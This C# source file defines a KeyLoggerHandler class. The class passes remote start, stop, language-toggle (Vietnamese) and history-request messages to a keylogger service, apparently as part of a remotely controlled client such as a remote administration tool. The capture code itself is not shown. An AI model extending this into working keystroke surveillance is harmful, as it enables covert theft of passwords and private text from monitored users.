using System.Threading.Tasks;
using Client.Services;
using Common.Networking;

namespace Client.Handlers
{
    public sealed class KeyLoggerHandler
    {
        private readonly KeyLoggerService _service;
        public KeyLoggerHandler(KeyLoggerService service)
        {
            _service = service;
        }

        public Task HandleStartAsync(KeyLoggerStart request)
        {
            _service.SetClientId(request.ClientId);
            _service.Start(request.Payload);
            return Task.CompletedTask;
        }

        public Task HandleStopAsync(KeyLoggerStop request)
        {
            _service.Stop();
            return Task.CompletedTask;
        }

        public Task HandleLangToggleAsync(KeyLoggerLangToggle toggle)
        {
            _service.SetLanguageMode(toggle.Vietnamese);
            return Task.CompletedTask;
        }

        public Task HandleHistoryRequestAsync(KeyLoggerHistoryRequest request)
        {
            return _service.HandleHistoryRequestAsync(request);
        }
    }
}


